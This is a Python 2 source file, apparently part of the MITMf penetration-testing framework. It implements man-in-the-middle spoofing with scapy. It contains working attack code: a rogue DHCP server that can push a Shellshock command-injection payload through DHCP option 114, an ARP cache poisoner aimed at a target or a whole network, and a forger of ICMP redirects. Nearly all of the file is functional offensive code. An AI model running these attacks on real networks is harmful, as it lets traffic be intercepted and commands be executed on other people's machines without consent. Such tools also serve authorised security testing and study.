#!/usr/bin/env python2.7

# Copyright (c) 2014-2016 Marcello Salvati
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 3 of the
# License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
# USA
#

import logging
import threading
import binascii
import random

from base64 import b64decode
from urllib import unquote
from time import sleep

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)  #Gets rid of IPV6 Error when importing scapy
from scapy.all import *

class _DHCP():

	def __init__(self, interface, dhcpcfg, ip, mac):
		self.interface   = interface
		self.ip_address  = ip
		self.mac_address = mac
		self.shellshock  = None
		self.debug       = False
		self.dhcpcfg     = dhcpcfg
		self.rand_number = []
		self.dhcp_dic    = {}

	def start(self):
		t = threading.Thread(name="dhcp_spoof", target=self.dhcp_sniff, args=(self.interface,))
		t.setDaemon(True)
		t.start()

	def dhcp_sniff(self, interface):
		sniff(filter="udp and (port 67 or 68)", prn=self.dhcp_callback, iface=interface)

	def dhcp_rand_ip(self):
		pool = self.dhcpcfg['ip_pool'].split('-')
		trunc_ip = pool[0].split('.'); del(trunc_ip[3])
		max_range = int(pool[1])
		min_range = int(pool[0].split('.')[3])
		number_range = range(min_range, max_range)
		for n in number_range:
			if n in self.rand_number:
				number_range.remove(n)
		rand_number = random.choice(number_range)
		self.rand_number.append(rand_number)
		rand_ip = '.'.join(trunc_ip) + '.' + str(rand_number)

		return rand_ip

	def dhcp_callback(self, resp):
		if resp.haslayer(DHCP):
			xid = resp[BOOTP].xid
			mac_addr = resp[Ether].src
			raw_mac = binascii.unhexlify(mac_addr.replace(":", ""))
			if xid in self.dhcp_dic.keys():
				client_ip = self.dhcp_dic[xid]
			else:
				client_ip = self.dhcp_rand_ip()
				self.dhcp_dic[xid] = client_ip

			if resp[DHCP].options[0][1] is 1:
				logging.info("Got DHCP DISCOVER from: " + mac_addr + " xid: " + hex(xid))
				logging.info("Sending DHCP OFFER")
				packet = (Ether(src=self.mac_address, dst='ff:ff:ff:ff:ff:ff') /
				IP(src=self.ip_address, dst='255.255.255.255') /
				UDP(sport=67, dport=68) /
				BOOTP(op='BOOTREPLY', chaddr=raw_mac, yiaddr=client_ip, siaddr=self.ip_address, xid=xid) /
				DHCP(options=[("message-type", "offer"),
					('server_id', self.ip_address),
					('subnet_mask', self.dhcpcfg['subnet']),
					('router', self.ip_address),
					('lease_time', 172800),
					('renewal_time', 86400),
					('rebinding_time', 138240),
					"end"]))

				try:
					packet[DHCP].options.append(tuple(('name_server', self.dhcpcfg['dns_server'])))
				except KeyError:
					pass

				sendp(packet, iface=self.interface, verbose=self.debug)

			if resp[DHCP].options[0][1] is 3:
				logging.info("Got DHCP REQUEST from: " + mac_addr + " xid: " + hex(xid))
				packet = (Ether(src=self.mac_address, dst='ff:ff:ff:ff:ff:ff') /
				IP(src=self.ip_address, dst='255.255.255.255') /
				UDP(sport=67, dport=68) /
				BOOTP(op='BOOTREPLY', chaddr=raw_mac, yiaddr=client_ip, siaddr=self.ip_address, xid=xid) /
				DHCP(options=[("message-type", "ack"),
					('server_id', self.ip_address),
					('subnet_mask', self.dhcpcfg['subnet']),
					('router', self.ip_address),
					('lease_time', 172800),
					('renewal_time', 86400),
					('rebinding_time', 138240)]))

				try:
					packet[DHCP].options.append(tuple(('name_server', self.dhcpcfg['dns_server'])))
				except KeyError:
					pass

				if self.shellshock:
					logging.info("Sending DHCP ACK with shellshock payload")
					packet[DHCP].options.append(tuple((114, "() { ignored;}; " + self.shellshock)))
					packet[DHCP].options.append("end")
				else:
					logging.info("Sending DHCP ACK")
					packet[DHCP].options.append("end")

				sendp(packet, iface=self.interface, verbose=self.debug)

class _ARP():

	def __init__(self, gateway, interface, mac):

		self.gateway    = gateway
		self.gatewaymac = getmacbyip(gateway)
		self.mac        = mac
		self.target     = None
		self.targetmac  = None
		self.interface  = interface
		self.arpmode    = 'req'
		self.debug      = False
		self.send       = True
		self.arp_inter  = 3

	def start(self):
		if self.gatewaymac is None:
			sys.exit("[-] Error: Could not resolve gateway's MAC address")

		if self.target:
			self.targetmac = getmacbyip(self.target)
			if self.targetmac is None:
				sys.exit("[-] Error: Could not resolve target's MAC address")

		if self.arpmode == 'req':
			pkt = self.build_arp_req()
		
		elif self.arpmode == 'rep':
			pkt = self.build_arp_rep()

		t = threading.Thread(name='arp_spoof', target=self.send_arps, args=(pkt, self.interface, self.debug,))
		t.setDaemon(True)
		t.start()

	def send_arps(self, pkt, interface, debug):
		while self.send:
			sendp(pkt, inter=self.arp_inter, iface=interface, verbose=debug)

	def stop(self):
		self.send = False
		sleep(3)
		self.arp_inter = 1
		
		if self.target:
			print "\n[*] Re-ARPing target"
			self.reARP_target(5)

		print "\n[*] Re-ARPing network" 
		self.reARP_net(5)

	def build_arp_req(self):
		if self.target is None:
			pkt = Ether(src=self.mac, dst='ff:ff:ff:ff:ff:ff')/ARP(hwsrc=self.mac, psrc=self.gateway, pdst=self.gateway)
		elif self.target:
			pkt = Ether(src=self.mac, dst=self.targetmac)/\
			ARP(hwsrc=self.mac, psrc=self.gateway, hwdst=self.targetmac, pdst=self.target)

		return pkt

	def build_arp_rep(self):
		if self.target is None:
			pkt = Ether(src=self.mac, dst='ff:ff:ff:ff:ff:ff')/ARP(hwsrc=self.mac, psrc=self.gateway, op=2)
		elif self.target:
			pkt = Ether(src=self.mac, dst=self.targetmac)/\
			ARP(hwsrc=self.mac, psrc=self.gateway, hwdst=self.targetmac, pdst=self.target, op=2)

		return pkt

	def reARP_net(self, count):
		pkt = Ether(src=self.gatewaymac, dst='ff:ff:ff:ff:ff:ff')/\
		ARP(psrc=self.gateway, hwsrc=self.gatewaymac, op=2)

		sendp(pkt, inter=self.arp_inter, count=count, iface=self.interface)

	def reARP_target(self, count):
		pkt = Ether(src=self.gatewaymac, dst='ff:ff:ff:ff:ff:ff')/\
		ARP(psrc=self.target, hwsrc=self.targetmac, op=2)

		sendp(pkt, inter=self.arp_inter, count=count, iface=self.interface)

class _ICMP():

	def __init__(self, interface, target, gateway, ip_address):

		self.target        = target
		self.gateway       = gateway
		self.interface     = interface
		self.ip_address    = ip_address
		self.debug         = False
		self.send          = True
		self.icmp_interval = 2

	def build_icmp(self):
		pkt = IP(src=self.gateway, dst=self.target)/ICMP(type=5, code=1, gw=self.ip_address) /\
			  IP(src=self.target, dst=self.gateway)/UDP()

		return pkt

	def start(self):
		pkt = self.build_icmp()

		t = threading.Thread(name='icmp_spoof', target=self.send_icmps, args=(pkt, self.interface, self.debug,))
		t.setDaemon(True)
		t.start()

	def stop(self):
		self.send = False
		sleep(3)

	def send_icmps(self, pkt, interface, debug):
		while self.send:
			sendp(pkt, inter=self.icmp_interval, iface=interface, verbose=debug)
